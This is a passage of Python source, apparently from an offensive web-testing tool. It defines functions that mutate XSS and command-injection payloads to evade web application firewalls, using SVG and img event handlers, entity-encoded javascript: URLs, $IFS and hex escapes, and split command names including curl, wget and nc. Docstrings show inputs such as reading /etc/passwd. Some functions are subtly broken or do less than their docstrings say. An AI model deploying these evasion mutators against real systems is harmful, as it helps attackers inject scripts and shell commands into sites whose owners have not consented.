def _xss_svg_payload(payload: str) -> str:
    """Replace <script> blocks with SVG-based vectors.
    <script>X</script> → <svg/onload=X>"""
    result = re.sub(
        r"<script>(.*?)</script>",
        lambda m: f"<svg/onload={m.group(1)}>",
        payload,
        flags=re.IGNORECASE | re.DOTALL,
    )
    return result


def _xss_img_onerror(payload: str) -> str:
    """Replace <script> with <img src=x onerror=...> vectors."""
    result = re.sub(
        r"<script>(.*?)</script>",
        lambda m: f'<img src=x onerror={m.group(1)}>',
        payload,
        flags=re.IGNORECASE | re.DOTALL,
    )
    return result


def _xss_template_literal(payload: str) -> str:
    """Use JavaScript template literals to break up alert():
    alert(1) → alert`1` or ${alert(1)}"""
    return payload.replace("alert(1)", "alert`1`").replace("alert('", "${alert('")


def _xss_javascript_protocol(payload: str) -> str:
    """Use javascript: protocol with entity encoding:
    javascript:alert(1) → java&#115;cript:alert(1)"""
    return payload.replace("javascript:", "java&#115;cript:").replace(
        "javascript:", "java\tscript:"
    )


def _xss_event_handler_variants(payload: str) -> str:
    """Replace common event handlers with less-monitored alternatives.
    onerror → onfocus/onmouseover/onauxclick"""
    alternatives = ["onfocus", "onmouseover", "onauxclick", "ontoggle", "onpointerover"]
    chosen = random.choice(alternatives)
    return payload.replace("onerror=", f"{chosen}=").replace("onload=", f"{chosen}=")


def _xss_encoding_bypass(payload: str) -> str:
    """Mix URL encoding, HTML entities, and JS escapes within XSS payloads."""
    result = payload
    result = result.replace("<", "\\x3c").replace(">", "\\x3e")
    return result


# ── Command injection specific mutations ────────────────────────────────────

def _cmdi_ifs_substitution(payload: str) -> str:
    """Replace spaces with $IFS (Internal Field Separator) in shell commands.
    ; cat /etc/passwd → ;cat${IFS}/etc/passwd
    Bypasses WAFs that require space-after-semicolon patterns."""
    result = payload.replace(" ", "${IFS}")
    return result


def _cmdi_hex_escaping(payload: str) -> str:
    """Replace command chars with hex: ; → $'\\x3b', | → $'\\x7c'.
    Bash interprets $'\\xHH' as the literal character."""
    replacements = {
        ";": "$'\\x3b'", "|": "$'\\x7c'", "&": "$'\\x26'",
        " ": "$'\\x20'",
    }
    result = payload
    for char, esc in replacements.items():
        result = result.replace(char, esc)
    return result


def _cmdi_backtick_substitution(payload: str) -> str:
    """Replace $() with backtick notation: $(sleep 5) → `sleep 5`."""
    return re.sub(r"\$\(([^)]+)\)", r"`\1`", payload)


def _cmdi_variable_expansion(payload: str) -> str:
    """Insert empty variable expansions to break up command names:
    sleep → sl${x}eep, cat → c${x}at
    Bash ignores undefined variables, but WAF regex won't match 'sl${x}eep'."""
    commands = ["sleep", "cat", "id", "whoami", "ls", "dir", "ping", "curl", "wget", "nc"]
    result = payload
    for cmd in commands:
        if cmd in result:
            mid = len(cmd) // 2
            broken = cmd[:mid] + "${z}" + cmd[mid:]
            result = result.replace(cmd, broken, 1)
    return result


def _cmdi_newline_injection(payload: str) -> str:
    """Use URL-encoded newlines as command separators:
    ; sleep 5 → %0asleep%205"""
    result = payload
    for sep in [";", "&&", "||", "|"]:
        result = result.replace(sep, "%0a")
    return result


